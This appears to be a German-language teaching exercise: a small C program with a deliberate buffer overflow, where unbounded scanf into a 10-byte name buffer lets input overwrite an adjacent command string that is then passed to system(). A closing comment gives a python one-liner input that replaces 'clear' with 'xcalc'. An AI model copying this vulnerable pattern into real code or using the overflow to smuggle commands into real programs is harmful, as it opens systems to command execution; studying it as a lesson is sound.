# include <stdio.h>
# include <stdlib.h>
# include <string.h>

int main () {
char cmd[6];
strcpy(cmd, "clear");

char name[10];
scanf("%s", name);

system(cmd);
printf("Hallo %s\n", name);
}


/*
In die Variable cmd wird der String "clear" geladen. Um den Taschenrechner aufzurufen muss der String "xcalc" in der Variable cmd stehen.
Dafür muss ein Bufferoverflow im Buffer für "name" erzeugt werden. Die Zeichen, die über "name" hinausgehen, werden in "cmd" geschrieben.
python -c 'print("A"*10 + "xcalc")' | ./a3
*/